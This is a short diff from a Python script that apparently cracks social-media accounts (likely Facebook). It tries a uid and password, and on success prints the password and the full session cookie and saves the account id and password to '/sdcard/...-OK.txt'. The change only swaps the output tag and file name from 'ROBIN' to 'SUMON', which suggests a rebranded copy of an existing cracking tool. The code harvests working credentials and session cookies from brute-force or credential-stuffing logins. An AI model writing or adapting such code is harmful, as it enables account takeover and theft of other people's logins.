@@ -262,10 +262,10 @@ def mumitx(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m[ROBIN-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
+                print('\r\r\033[1;32m[SUMON-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                 print('\033[1;32m[COOKIE] = \033[1;37m'+coki+ '')
                 cek_apk(session,coki)
-                open('/sdcard/ROBIN-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                open('/sdcard/SUMON-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
